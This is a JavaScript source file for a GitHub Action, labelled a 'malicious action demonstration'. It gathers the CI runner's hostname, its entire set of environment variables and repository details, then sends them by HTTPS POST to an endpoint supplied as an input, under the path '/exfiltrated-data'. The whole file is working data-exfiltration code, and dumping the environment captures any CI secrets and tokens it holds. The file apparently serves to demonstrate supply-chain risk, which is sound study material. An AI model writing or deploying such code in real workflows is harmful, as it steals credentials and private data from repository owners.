const core = require('@actions/core');
const exec = require('@actions/exec');
const https = require('https');

async function run() {
  try {
    const targetEndpoint = core.getInput('target_endpoint');
    const dataType = core.getInput('data_type') || 'hostname';
    
    console.log('=== MALICIOUS ACTION DEMONSTRATION ===');
    console.log(`Target endpoint: ${targetEndpoint}`);
    console.log(`Data type: ${dataType}`);
    
    // Collect data based on type
    let collectedData = {};
    
    if (dataType === 'hostname' || dataType === 'all') {
      collectedData.hostname = await getHostname();
    }
    
    if (dataType === 'environment' || dataType === 'all') {
      collectedData.environment = process.env;
    }
    
    if (dataType === 'repository_info' || dataType === 'all') {
      collectedData.repository_info = {
        repository: process.env.GITHUB_REPOSITORY,
        actor: process.env.GITHUB_ACTOR,
        event: process.env.GITHUB_EVENT_NAME,
        ref: process.env.GITHUB_REF,
        sha: process.env.GITHUB_SHA
      };
    }
    
    // Add metadata
    collectedData.metadata = {
      timestamp: new Date().toISOString(),
      action: 'malicious-data-exfiltration',
      version: '1.0.0'
    };
    
    // Exfiltrate data
    await exfiltrateData(targetEndpoint, collectedData);
    
    console.log('Data exfiltration completed successfully');
    
  } catch (error) {
    core.setFailed(`Action failed: ${error.message}`);
  }
}

async function getHostname() {
  return new Promise((resolve, reject) => {
    exec.exec('hostname', [], {
      silent: true,
      listeners: {
        stdout: (data) => {
          resolve(data.toString().trim());
        },
        stderr: (data) => {
          reject(new Error(data.toString()));
        }
      }
    });
  });
}

async function exfiltrateData(endpoint, data) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(data);
    
    const options = {
      hostname: endpoint,
      port: 443,
      path: '/exfiltrated-data',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
        'User-Agent': 'Malicious-Action-Demo/1.0'
      }
    };
    
    const req = https.request(options, (res) => {
      console.log(`Data sent to ${endpoint}, status: ${res.statusCode}`);
      resolve();
    });
    
    req.on('error', (error) => {
      console.error(`Failed to send data: ${error.message}`);
      reject(error);
    });
    
    req.write(postData);
    req.end();
  });
}

run();
